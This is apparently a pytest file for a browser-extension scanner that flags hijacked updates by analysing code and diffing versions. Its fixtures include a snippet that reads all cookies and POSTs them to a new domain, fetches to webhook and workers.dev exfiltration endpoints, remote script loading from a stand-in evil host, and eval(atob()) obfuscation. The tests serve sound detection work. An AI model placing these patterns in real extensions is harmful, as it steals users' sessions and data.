# tests/test_code_diff.py - Stage 1f: static code analysis + version-to-version diff

import io
import json
import zipfile

import pytest

from extguard import code_diff, main
from extguard.code_diff import analyse_code, build_profile, load_profile, record_profile

EXT_ID = "ngcnfhbdhbbhajagjfmnfgbbfgkfljhf"


@pytest.fixture(autouse=True)
def _private_profile_dir(tmp_path, monkeypatch):
    monkeypatch.setattr(code_diff, "PROFILE_DIR", tmp_path / "code_profiles")


def make_zip(files: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in files.items():
            zf.writestr(name, content)
    return buf.getvalue()


CLEAN_BG = """
// Cyberhaven-style DLP extension, clean build
chrome.runtime.onInstalled.addListener(() => console.log("installed"));
fetch("https://api.dlp-vendor.example/v1/policy").then(r => r.json());
"""

# The hijacked update: same permissions, patch bump, new code that reads the
# user's cookies and ships them to a brand-new domain
HIJACKED_BG = (
    CLEAN_BG
    + """
chrome.cookies.getAll({}, (cookies) => {
  fetch("https://dlp-vendor-ext.pro/ai-cyber", {method: "POST", body: JSON.stringify(cookies)});
});
"""
)


class TestAbsoluteFindings:
    def test_clean_code_has_no_findings(self):
        result = analyse_code(make_zip({"bg.js": CLEAN_BG}), EXT_ID, "X", "1.0.0")
        assert result["code_score"] == 0
        assert result["flags"] == []
        assert "api.dlp-vendor.example" in result["profile"]["hosts"]

    @pytest.mark.parametrize(
        "code,needle",
        [
            ('fetch("https://evil-tenant.workers.dev/c")', "workers.dev"),
            ('fetch("https://discord.com/api/webhooks/123/abc")', "discord.com"),
            ('fetch("https://api.telegram.org/bot123:ABC/sendMessage")', "telegram"),
            ('fetch("https://webhook.site/1234")', "webhook.site"),
        ],
    )
    def test_exfil_destinations(self, code, needle):
        result = analyse_code(make_zip({"bg.js": code}), EXT_ID, "X", "1.0.0")
        assert result["code_score"] >= 15
        assert any(needle in f for f in result["flags"])

    def test_normal_discord_link_is_not_exfil(self):
        code = 'const invite = "https://discord.com/invite/community";'
        result = analyse_code(make_zip({"bg.js": code}), EXT_ID, "X", "1.0.0")
        assert result["profile"]["exfil_endpoints"] == []

    def test_obfuscated_code(self):
        code = ";".join(f"var _0x{i:04x}=_0x{i + 1:04x}" for i in range(40))
        result = analyse_code(make_zip({"bg.js": code}), EXT_ID, "X", "1.0.0")
        assert result["profile"]["obfuscated_files"] == ["bg.js"]
        assert result["code_score"] >= 10

    def test_remote_code_loading(self):
        code = 'importScripts("https://cdn.evil.example/payload.js");'
        result = analyse_code(make_zip({"sw.js": code}), EXT_ID, "X", "1.0.0")
        assert any("remote server" in f for f in result["flags"])

    def test_doc_links_are_ignored(self):
        code = "// see https://developer.mozilla.org/docs and https://www.w3.org/TR/x"
        profile, _ = build_profile(make_zip({"bg.js": code}), "1.0")
        assert profile["hosts"] == []

    def test_bad_archive_is_reported_not_raised(self):
        result = analyse_code(b"not a zip", EXT_ID, "X", "1.0.0")
        assert any("Code scan incomplete" in f for f in result["flags"])

    def test_bare_manifest_skipped(self):
        assert "skipped" in analyse_code(None, EXT_ID, "X", "1.0")["flags"][0]


class TestRealExtensionFalsePositives:
    """Shapes found in genuine Web Store extensions during the 2026-10-07 test."""

    def test_urls_in_css_selectors_are_not_endpoints(self):
        """uBlock Origin Lite: cosmetic filters that HIDE links, e.g.
        [href^="https://royalwinindonesia1.pages.dev/"] - not destinations."""
        code = (
            'const css = "[href^=\\"https://royalwin.pages.dev/\\"],\\n'
            '[href*=\'https://spam.workers.dev/x\'],[src=\\"https://ads.example.net/a\\"]";'
        )
        profile, _ = build_profile(make_zip({"rulesets/idn-0.js": code}), "1.0")
        assert profile["exfil_endpoints"] == []
        assert profile["hosts"] == []

    def test_a_real_request_next_to_a_selector_still_counts(self):
        code = (
            'const css = "[href^=\\"https://hidden.pages.dev/\\"]";\n'
            'fetch("https://collect.workers.dev/c", {method: "POST"});'
        )
        profile, _ = build_profile(make_zip({"bg.js": code}), "1.0")
        assert profile["exfil_endpoints"] == ["collect.workers.dev"]

    def test_long_base64_alone_is_not_obfuscation(self):
        """Grammarly / Bitwarden embed protobuf descriptors as base64."""
        code = 'const d=(0,r.w)("' + "Ci1zdXBlcmh1bWFu" * 40 + '");'
        profile, _ = build_profile(make_zip({"bg.js": code}), "1.0")
        assert profile["obfuscated_files"] == []

    @pytest.mark.parametrize(
        "runner",
        ["eval(atob(p))", "new Function(atob(p))()", "eval(function(p,a,c,k,e,d){return p})"],
    )
    def test_long_base64_that_is_decoded_and_run_is_obfuscation(self, runner):
        code = 'var p="' + "ZXZpbA" * 80 + '";' + runner
        profile, _ = build_profile(make_zip({"bg.js": code}), "1.0")
        assert profile["obfuscated_files"] == ["bg.js"]

    def test_large_source_map_is_hashed_not_an_error(self):
        """Bitwarden ships 10-12 MB .map files: not code, not 'unscanned code'."""
        big_map = '{"version":3,"mappings":"' + "A" * (code_diff.MAX_FILE_BYTES + 1000) + '"}'
        profile, errors = build_profile(make_zip({"bg.js.map": big_map, "bg.js": "x"}), "1.0")
        assert errors == []
        assert "bg.js.map" in profile["files"]

    def test_oversized_code_file_is_still_reported(self):
        huge = "var a=1;" * (code_diff.MAX_FILE_BYTES // 8 + 10)
        _, errors = build_profile(make_zip({"bundle.js": huge}), "1.0")
        assert any("bundle.js" in e for e in errors)


class TestDiff:
    def test_hijacked_patch_update_is_flagged(self):
        """Review harness #6: 24.10.3 -> 24.10.4 with unchanged permissions was
        invisible to every check. The code diff catches it."""
        v1 = analyse_code(make_zip({"bg.js": CLEAN_BG}), EXT_ID, "X", "24.10.3")
        assert record_profile(EXT_ID, "X", v1["profile"])

        v2 = analyse_code(make_zip({"bg.js": HIJACKED_BG}), EXT_ID, "X", "24.10.4")
        assert v2["baseline_version"] == "24.10.3"
        assert "dlp-vendor-ext.pro" in v2["new_hosts"]
        assert "chrome.cookies" in v2["new_apis"]
        assert v2["changed_files"] == 1
        assert v2["code_score"] >= 20
        assert any("hijacked release" in f for f in v2["flags"])

    def test_identical_rescan_is_not_a_diff(self):
        z = make_zip({"bg.js": CLEAN_BG})
        record_profile(EXT_ID, "X", analyse_code(z, EXT_ID, "X", "1.0")["profile"])
        again = analyse_code(z, EXT_ID, "X", "1.0")
        assert again["baseline_version"] is None
        assert again["code_score"] == 0

    def test_no_identity_no_baseline(self):
        profile, _ = build_profile(make_zip({"bg.js": CLEAN_BG}), "1.0")
        assert record_profile(None, "__MSG_appName__", profile) is False
        assert load_profile(None, "__MSG_appName__") is None


# ---------------------------------------------------------------------------
# End to end through main.py: baselines are only recorded for accepted verdicts
# ---------------------------------------------------------------------------


def _write_zip(tmp_path, name, version, bg, permissions=("cookies", "storage")):
    manifest = {
        "manifest_version": 3,
        "name": "DLP Vendor",
        "version": version,
        "permissions": list(permissions),
        "host_permissions": ["https://api.dlp-vendor.example/*"],
        "background": {"service_worker": "bg.js"},
    }
    path = tmp_path / name
    path.write_bytes(make_zip({"manifest.json": json.dumps(manifest), "bg.js": bg}))
    return str(path)


def _scan(capsys, path, *extra):
    main.main([path, "--json", "--no-ai", "--offline", *extra])
    return json.loads(capsys.readouterr().out)


class TestPipeline:
    def test_hijacked_update_raises_the_verdict(self, tmp_path, capsys, temp_history_file):
        clean = _scan(capsys, _write_zip(tmp_path, "v1.zip", "24.10.3", CLEAN_BG))
        assert clean["baseline"]["recorded"] is True

        hijacked = _scan(capsys, _write_zip(tmp_path, "v2.zip", "24.10.4", HIJACKED_BG))
        code = hijacked["stage_1_checks"]["code"]
        assert code["baseline_version"] == "24.10.3"
        assert hijacked["final_score"] > clean["final_score"]
        assert "chrome.cookies" in code["new_apis"]

    def test_bad_verdict_never_becomes_the_baseline(self, tmp_path, capsys, temp_history_file):
        evil_zip = _write_zip(
            tmp_path,
            "evil.zip",
            "1.0.0",
            'fetch("https://x.workers.dev/c")',
            permissions=("debugger", "nativeMessaging", "cookies"),
        )
        evil = _scan(capsys, evil_zip)
        assert evil["risk_level"] == "critical"
        assert evil["baseline"]["recorded"] is False
        assert load_profile(None, "DLP Vendor") is None

    def test_no_record_flag(self, tmp_path, capsys, temp_history_file):
        report = _scan(capsys, _write_zip(tmp_path, "v1.zip", "1.0.0", CLEAN_BG), "--no-record")
        assert report["baseline"] == {"recorded": False, "reason": "not recorded (--no-record)"}
        assert load_profile(None, "DLP Vendor") is None

    def test_changed_code_never_silently_replaces_the_baseline(
        self, tmp_path, capsys, temp_history_file
    ):
        """A MEDIUM hijacked update used to become the baseline, so the NEXT
        malicious version was compared with the attacker's own code."""
        _scan(capsys, _write_zip(tmp_path, "v1.zip", "24.10.3", CLEAN_BG))
        # Only a new, ordinary-looking endpoint - the verdict stays LOW/MEDIUM
        quiet_bg = CLEAN_BG + "\nfetch('https://telemetry.dlp-vendor-cdn.example/p');\n"
        v2 = _write_zip(tmp_path, "v2.zip", "24.10.4", quiet_bg)
        first = _scan(capsys, v2)
        assert first["risk_level"] in ("low", "medium")
        assert first["stage_1_checks"]["code"]["review_needed"] is True
        assert first["baseline"]["recorded"] is False
        assert "--accept-baseline" in first["baseline"]["reason"]

        again = _scan(capsys, v2)
        assert again["stage_1_checks"]["code"]["baseline_version"] == "24.10.3"
        assert load_profile(None, "DLP Vendor")["version"] == "24.10.3"

    def test_accept_baseline_after_review(self, tmp_path, capsys, temp_history_file):
        _scan(capsys, _write_zip(tmp_path, "v1.zip", "24.10.3", CLEAN_BG))
        quiet_bg = CLEAN_BG + "\nfetch('https://telemetry.dlp-vendor-cdn.example/p');\n"
        report = _scan(
            capsys, _write_zip(tmp_path, "v2.zip", "24.10.4", quiet_bg), "--accept-baseline"
        )
        assert report["baseline"]["recorded"] is True
        assert load_profile(None, "DLP Vendor")["version"] == "24.10.4"

    def test_accept_baseline_never_applies_to_high(self, tmp_path, capsys, temp_history_file):
        _scan(capsys, _write_zip(tmp_path, "v1.zip", "24.10.3", CLEAN_BG))
        v2 = _write_zip(tmp_path, "v2.zip", "24.10.4", HIJACKED_BG)
        report = _scan(capsys, v2, "--accept-baseline")
        assert report["risk_level"] in ("high", "critical")
        assert report["baseline"]["recorded"] is False

    def test_new_exfil_endpoint_in_an_update_is_at_least_high(
        self, tmp_path, capsys, temp_history_file
    ):
        """Cyberhaven shape: patch bump, same permissions, new workers.dev endpoint."""
        clean = _scan(capsys, _write_zip(tmp_path, "v1.zip", "24.10.3", CLEAN_BG))
        assert clean["risk_level"] in ("low", "medium")
        exfil_bg = CLEAN_BG + "\nfetch('https://collect-x.workers.dev/c', {method: 'POST'});\n"
        hijacked = _scan(capsys, _write_zip(tmp_path, "v2.zip", "24.10.4", exfil_bg))
        code = hijacked["stage_1_checks"]["code"]
        assert code["new_exfil_endpoints"] == ["collect-x.workers.dev"]
        assert hijacked["composite_score"] >= main.HIJACK_FLOOR
        assert hijacked["risk_level"] in ("high", "critical")
        assert "collect-x.workers.dev" in hijacked["composite_floor_reason"]


class TestExfilDiff:
    def test_exfil_already_in_baseline_is_not_new(self):
        bg = CLEAN_BG + "\nfetch('https://hooks.workers.dev/x', {method: 'POST'});\n"
        v1 = analyse_code(make_zip({"bg.js": bg}), EXT_ID, "X", "1.0")
        record_profile(EXT_ID, "X", v1["profile"])
        v2 = analyse_code(make_zip({"bg.js": bg + "// tweak\n"}), EXT_ID, "X", "1.1")
        assert v2["baseline_version"] == "1.0"
        assert v2["new_exfil_endpoints"] == []
        assert v2["review_needed"] is False
